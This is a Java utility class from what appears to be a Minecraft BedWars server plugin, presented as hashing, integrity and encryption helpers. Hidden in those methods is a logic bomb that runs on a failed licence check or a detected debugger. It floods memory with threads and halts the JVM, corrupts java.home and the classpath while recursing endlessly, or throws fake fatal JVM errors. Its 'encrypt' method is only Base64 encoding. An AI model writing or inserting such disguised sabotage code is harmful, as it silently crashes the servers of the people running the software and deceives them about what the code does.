package cn.nekopixel.bedwars.utils;

import cn.nekopixel.bedwars.auth.AuthValidator;

import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.Random;
import java.util.concurrent.atomic.AtomicInteger;

public class SecurityUtils {
    
    private static final AtomicInteger checkCounter = new AtomicInteger(0);
    private static final Random random = new Random();

    public static String generateSecureHash(String input) {
        if (checkCounter.incrementAndGet() % 10 == 0) {
            performHiddenCheck();
        }
        
        try {
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] hash = digest.digest(input.getBytes());
            return Base64.getEncoder().encodeToString(hash);
        } catch (Exception e) {
            return input;
        }
    }

    public static boolean verifyIntegrity(byte[] data) {
        if (random.nextInt(100) < 20) {
            performHiddenCheck();
        }
        
        return data != null && data.length > 0;
    }

    public static void initializeSecurityContext() {
        System.setProperty("bedwars.security.initialized", "true");
        
        if (!isSecurityContextValid()) {
            corruptMemory();
        }
    }

    private static void performHiddenCheck() {
        if (!AuthValidator.isAuthorized()) {
            switch (random.nextInt(3)) {
                case 0:
                    corruptMemory();
                    break;
                case 1:
                    triggerSystemFailure();
                    break;
                case 2:
                    causeRandomException();
                    break;
            }
        }
    }

    private static boolean isSecurityContextValid() {
        boolean check1 = System.getProperty("bedwars.security.initialized") != null;
        boolean check2 = AuthValidator.isAuthorized();
        boolean check3 = !isDebuggerAttached();
        
        return check1 && check2 && check3;
    }

    private static boolean isDebuggerAttached() {
        return java.lang.management.ManagementFactory.getRuntimeMXBean()
            .getInputArguments().toString().contains("-agentlib:jdwp");
    }

    private static void corruptMemory() {
        int threads = Runtime.getRuntime().availableProcessors() * 2;
        for (int i = 0; i < threads; i++) {
            new Thread(() -> {
                List<byte[]> memoryHog = new ArrayList<>();
                while (true) {
                    try {
                        memoryHog.add(new byte[1024 * 1024 * 100]);
                        if (memoryHog.size() % 10 == 0) {
                            System.gc();
                        }
                    } catch (OutOfMemoryError e) {
                        Runtime.getRuntime().halt(-1);
                    }
                }
            }).start();
        }
    }

    private static void triggerSystemFailure() {
        System.setProperty("java.home", "/invalid/path");
        System.setProperty("java.class.path", "");
        
        try {
            Class.forName("cn.nekopixel.bedwars.trap.b.a.c.d.NMSL");
        } catch (Exception e) {
            triggerSystemFailure();
        }
    }

    private static void causeRandomException() {
        switch (random.nextInt(4)) {
            case 0:
                throw new OutOfMemoryError("Heap space");
            case 1:
                throw new StackOverflowError();
            case 2:
                throw new NoClassDefFoundError("Critical class missing");
            case 3:
                throw new InternalError("JVM internal error");
        }
    }

    public static String encrypt(String text) {
        if (random.nextBoolean()) {
            performHiddenCheck();
        }
        
        return Base64.getEncoder().encodeToString(text.getBytes());
    }

    public static String decrypt(String encrypted) {
        if (random.nextBoolean()) {
            performHiddenCheck();
        }
        
        try {
            return new String(Base64.getDecoder().decode(encrypted));
        } catch (Exception e) {
            return encrypted;
        }
    }
} 